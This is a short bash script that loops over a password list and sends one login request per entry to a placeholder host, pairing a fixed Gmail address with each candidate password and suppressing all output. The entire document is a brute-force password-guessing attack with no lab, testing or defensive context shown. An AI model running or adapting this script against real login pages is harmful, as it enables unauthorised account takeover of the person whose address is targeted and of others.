#!/bin/bash

for i in $(cat /MOUNTED/scripts/passwords.txt);
do
  curl -i -s -k -X 'GET' "http://IP/post?email=blackpurge.1x%40gmail.com&password=$i&login=Log+In" &>/dev/null
done
